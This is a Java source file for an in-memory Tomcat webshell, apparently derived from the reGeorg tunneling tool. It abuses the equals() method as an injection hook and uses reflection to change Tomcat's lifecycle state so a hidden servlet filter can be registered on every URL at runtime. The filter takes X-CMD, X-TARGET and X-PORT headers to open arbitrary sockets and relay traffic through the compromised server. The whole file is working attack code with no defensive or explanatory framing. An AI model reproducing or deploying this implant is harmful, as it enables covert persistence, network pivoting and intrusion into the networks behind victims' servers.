package reGeorg;

import javax.servlet.*;
import java.io.IOException;

public class MemReGeorg implements javax.servlet.Filter{
    private javax.servlet.http.HttpServletRequest request = null;
    private org.apache.catalina.connector.Response response = null;
    private javax.servlet.http.HttpSession session =null;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    public void destroy() {}
    @Override
    public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException {
        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;
        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;
        javax.servlet.http.HttpSession session = request.getSession();
        String cmd = request.getHeader("X-CMD");
        if (cmd != null) {
            response.setHeader("X-STATUS", "OK");
            if (cmd.compareTo("CONNECT") == 0) {
                try {
                    String target = request.getHeader("X-TARGET");
                    int port = Integer.parseInt(request.getHeader("X-PORT"));
                    java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open();
                    socketChannel.connect(new java.net.InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket", socketChannel);
                    response.setHeader("X-STATUS", "OK");
                } catch (java.net.UnknownHostException e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                } catch (java.io.IOException e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                }
            } else if (cmd.compareTo("DISCONNECT") == 0) {
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try{
                    socketChannel.socket().close();
                } catch (Exception ex) {
                }
                session.invalidate();
            } else if (cmd.compareTo("READ") == 0){
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try {
                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(512);
                    int bytesRead = socketChannel.read(buf);
                    ServletOutputStream so = response.getOutputStream();
                    while (bytesRead > 0){
                        so.write(buf.array(),0,bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = socketChannel.read(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                    so.flush();
                    so.close();
                } catch (Exception e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                }

            } else if (cmd.compareTo("FORWARD") == 0){
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try {
                    int readlen = request.getContentLength();
                    byte[] buff = new byte[readlen];
                    request.getInputStream().read(buff, 0, readlen);
                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen);
                    buf.clear();
                    buf.put(buff);
                    buf.flip();
                    while(buf.hasRemaining()) {
                        socketChannel.write(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                } catch (Exception e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                    socketChannel.socket().close();
                }
            }
        } else {
            filterChain.doFilter(request, response);
        }
    }

    public boolean equals(Object obj) {
        Object[] context=(Object[]) obj;
        this.session = (javax.servlet.http.HttpSession ) context[2];
        this.response = (org.apache.catalina.connector.Response) context[1];
        this.request = (javax.servlet.http.HttpServletRequest) context[0];

        try {
            dynamicAddFilter(new MemReGeorg(),"reGeorg","/*",request);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        return true;
    }

    public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {
        javax.servlet.ServletContext servletContext=request.getServletContext();
        if (servletContext.getFilterRegistration(name) == null) {
            java.lang.reflect.Field contextField = null;
            org.apache.catalina.core.ApplicationContext applicationContext =null;
            org.apache.catalina.core.StandardContext standardContext=null;
            java.lang.reflect.Field stateField=null;
            javax.servlet.FilterRegistration.Dynamic filterRegistration =null;

            try {
                contextField=servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
                contextField=applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(name, filter);
                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url});
                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, null);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }catch (Exception e){
                ;
            }finally {
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }
        }
    }
}